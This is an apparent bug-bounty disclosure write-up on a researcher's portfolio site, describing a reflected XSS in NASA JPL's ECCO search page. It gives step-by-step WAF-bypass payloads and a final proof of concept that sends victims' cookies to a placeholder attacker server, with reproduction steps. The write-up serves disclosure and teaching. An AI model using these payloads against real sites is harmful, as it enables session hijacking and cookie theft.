---
layout: default
---

<div class="container">
<article>
  <a href="../../../en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    Cyber Research Portfolio
  </a>
  <div class="lang-switcher">
    <a href="../../../es/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn">Español (ES)</a>
    <a href="./" class="lang-btn active">English (EN)</a>
  </div>

  <div class="bounty-header">
    <h1>NASA JPL: Reflected XSS Cookie Exfiltration</h1>
    <p>Bypassing Web Application Firewalls (WAF) to achieve session takeover on NASA JPL ECCO assets.</p>
  </div>

  <div class="bounty-content">

    <h2>🔍 Search Anything</h2>
    <p>As with any bug bounty program, the first step was to use the page as a normal user. The search field stood out, so we tested it:</p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></p>
    <p>We realized that the value we entered was reflected on the website.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png" alt="Search Normal">
    <p>Inspecting the website's source code, we saw that our input was inside a JavaScript <code>console.log()</code> function:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png" alt="Search Normal Result">
    <pre><code>console.log('pwn');</code></pre>

    <h2>🛡️ Tag &lt;script&gt; Disallowed</h2>
    <p>We ran basic XSS tests using the <code>&lt;script&gt;</code> tag:</p>
    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
    <p>The Web Application Firewall (WAF) rejected our requests at the slightest sign of malicious activity.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png" alt="WAF Blocking Script Tag">

    <h2>🏗️ Close Javascript console.log String</h2>
    <p>We decided to try closing the <code>console.log()</code> function to insert code right after it. We used the following payload: <code>pwn');</code></p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');</code></p>
    <p>We inserted <code>')</code> immediately after a string of text, which is what JavaScript needed to close <code>console.log()</code>. However, the semicolon <code>;</code> was not being displayed in the output, even though we entered it.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png" alt="Closing console.log">

    <h2>❓ Append Javascript (Not Working)</h2>
    <p>We tried adding more code after the semicolon:</p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></p>
    <p>After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png" alt="Where is semicolon">

    <h2>✅ Append Javascript (Working)</h2>
    <p>To make it work and start injecting code, we had to URL-encode the semicolon, changing it from <code>;</code> to <code>%3b</code>.</p>
    <pre><code># Encode ; to %3b
pwn')%3balert(1)</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn')%3balert(1)</code></p>
    <p>From that point on, we could enter JavaScript code to carry out the attack.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png" alt="Bypass Semicolon">

    <h2>🚨 First Alert (Working)</h2>
    <p>Although the WAF did not accept the <code>&lt;script&gt;</code> tag, we managed to get it to render the closing <code>&lt;/script&gt;</code> tag.</p>
    <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//</code></p>
    <p>That payload was enough to carry out a successful <strong>Reflected XSS</strong> attack. This is how it looked within the website code:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png" alt="Alert 1 HTML">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png" alt="Alert 1">

    <h2>🛑 Second Alert (Firewall Blocks)</h2>
    <p>Once we had managed to execute an <code>alert()</code>, we wanted to go further and exfiltrate cookies.</p>
    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//</code></p>
    <p>We tested various payloads, but the WAF continued to reject our requests. As soon as it detected suspicious strings like <code>document.cookie</code>, it blocked us.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png" alt="WAF Blocking document.cookie">

    <h2>🔓 Third Alert (Firewall Bypass)</h2>
    <p>To achieve an effective WAF bypass, we created a variable <code>a</code> that contained <code>document</code>, and requested <code>cookie</code> from that variable.</p>
    <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//</code></p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png" alt="Document Cookie Alert">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png" alt="Document Cookie Result">
    <pre><code>pwn');    // Break the system logic.
a=document;  // Create the var a containing document.
alert(a.cookie); // Call alert with cookies
&lt;/script&gt;;//  // Close the &lt;script&gt; and comment the rest of the code</code></pre>

    <h2>🚀 Final Exploit (Cookies Exfiltration)</h2>
    <p>This is the final PoC. Instead of executing <code>alert</code>, it directly executes <code>fetch</code>, making a request to an attacker-controlled server where the victim's cookies will arrive.</p>
    <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png" alt="Cookies Fetch Exfiltration">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png" alt="Exfiltration Request">

    <h2>🎯 Steps To Reproduce</h2>
    <ol>
      <li>Start a public web server (e.g., using <a href="https://serveo.net/" target="_blank">Serveo</a> exposing a python localhost server).</li>
      <li>Replace <code>ATTACKER_SERVER</code> with the URL Serveo generated for you.</li>
      <li>Visit the URL:<br><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></li>
      <li>You'll receive a request with the victim's cookies appended.</li>
    </ol>

    <h2>🎖️ Recognition & Award</h2>
    <p>NASA JPL acknowledged this disclosure with an official Letter of Recognition, confirming the impact and remediation of the vulnerability.</p>
    <div class="pdf-container">
      <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf#toolbar=0" width="100%" height="100%" frameborder="0"></iframe>
    </div>
    <p style="text-align: center; margin-top: 20px;">
      <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
    </p>

    <h2>🤝 Collaboration Detail</h2>
    <p>This research was conducted in a 50/50 collaboration between <strong>{{ site.researchers.ivan.name }}</strong> and <strong>{{ site.researchers.diego.name }}</strong>. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.</p>
  </div>
</article>
</div>

<div class="zoom-overlay" id="zoomOverlay" onclick="this.classList.remove('active')">
  <img id="zoomImg" src="" alt="Zoom">
</div>
<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    document.getElementById('zoomImg').src = img.src;
    document.getElementById('zoomOverlay').classList.add('active');
  });
});
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
